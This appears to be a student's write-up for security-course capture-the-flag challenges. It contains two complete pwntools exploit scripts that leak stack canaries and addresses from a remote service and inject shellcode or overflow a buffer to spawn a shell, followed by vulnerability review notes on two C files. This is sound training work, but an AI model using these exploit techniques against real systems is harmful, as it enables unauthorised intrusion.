shellcrack
===========================

Flag: COMP6447{study_for_midsem_it's_on_monday}

General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
from pwn import *

shellcode = """
    push 6845231;
    push 1852400175;
    mov ebx, esp;
    mov eax, 0xb;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""
# p = process('./shellcrack')
p = remote("plzpwn.me","5001")
q = p.recv()
p.sendline('A'*0xf)
# q = p.recvline()[:-2]
q = p.recvuntil("!")[:-1]
can = u64(q[-9:-1])
ri= p.recvuntil('[')
add = int(p.recv(10),16)
payload = asm(shellcode)
p.recvuntil("].")
p.sendline(payload+'A'*(0x30-len(payload))+p64(can)+p32(add)*7)
p.interactive()
```

stack-dump2
=============

Flag: COMP6447{same_same_but_different}


General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
from pwn import *

# context.log_level = 'debug'

# p = process('./stack-dump2')
p = remote("plzpwn.me","5000")
p.recvuntil("stack pointer ")
useful = p.recv(10)
p.recv()
p.sendline('c')
seg = p.recvuntil("-")[:-1]
win = int(seg, 16) + 1901
p.recv()
p.sendline('a')
p.recv()
p.sendline('5')
sent = (int(useful,16)  + 0x71 - 0x8)
p.sendline(p32(sent))
p.recv()
p.sendline('b')
p.recvuntil(": ")
canary = p.recv(4)
p.sendline('a')
p.recv()
attack = '0AAA' + 'A'*92 + canary + p32(win)*3
p.sendline(str(len(attack)+1))
p.sendline(attack)
p.recv()
p.sendline('d')
p.interactive()
```

web_server.c
=============
line 37: buffer overflow
line 72: doesn't take into account that "./webpath" has already been written to the buffer
line 91: accessing array element out of bounds, but dunno if you can do anything with that, also a bad exit condition cause you're expecting the user to enter "!!!" ???
line 113: format string exploit since input is user input and could contain format modifiers
line 116: action is 1024 bytes long, whereas path is only 100 so this can lead to buffer overflow
line 127: writing 1000 bytes to a 100 byte buffer seems problematic
line 174: forgot to break yo

python4.c
=============
line 33: read outside of array memory
line 82: this is not safe
line 101: size_t is unsigned which could cause problems if trynig to use it with NO_CHARACTER (-1)
not checking return value of malloc anywhere
line 121: just cause the comment says the length is not null doesn't make it so
line 397: wrong syntax
line 446: integer overflow
line 451: the comment was probably meant to have a TODO tag in front of it cause atm it is not checking for overflow


RE
=============
#include<stdio>
int f(int x, int y) {
    return (x+y)%6;
}
